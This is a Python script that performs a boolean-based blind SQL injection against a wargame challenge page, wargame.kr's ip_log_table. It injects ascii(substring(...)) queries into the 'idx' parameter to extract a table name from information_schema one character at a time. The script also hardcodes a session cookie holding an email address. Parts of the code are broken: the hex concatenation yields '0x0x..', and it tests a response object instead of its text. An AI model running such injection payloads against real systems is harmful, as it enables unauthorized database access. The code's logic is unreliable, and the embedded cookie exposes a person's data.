import urllib.request, urllib3, re, sys, time, os, requests
from urllib import parse
header={'Cookie': 'ci_session=a%3A10%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%2253267d30a3d0cf39e5bf624f3b0267ae%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A8%3A%2210.0.2.2%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A115%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F66.0.3359.139+Safari%2F537.36%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1526455930%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22name%22%3Bs%3A8%3A%22alertJJM%22%3Bs%3A5%3A%22email%22%3Bs%3A21%3A%22chelsea2936%40naver.com%22%3Bs%3A4%3A%22lang%22%3Bs%3A3%3A%22kor%22%3Bs%3A11%3A%22achievement%22%3Bs%3A7%3A%22over+20%22%3Bs%3A5%3A%22point%22%3Bs%3A4%3A%228800%22%3B%7D046a16178ea53202df5bc10f57931832619345da',}

key=""
url="http://wargame.kr:8000/ip_log_table/chk.php"
for j in range(8):
    binary=""
    for i in range(ord('A'), ord('z') + 1):
        payload="21768 and ascii(substring((select table_name from information_schema.tables where TABLE_TYPE=0x42415345205441424C45 limit 1),"+str(j)+",1))>0x"+str(hex(i))
        data={'idx':payload,}
        res=requests.post(url,params=data, headers=header)
        print(res)
        if "2018-05-16" in res:
            key+=chr(i)
            print('[*]key: ',key)
        else:
            print('non match: ',chr(i))
print('key is: ',key)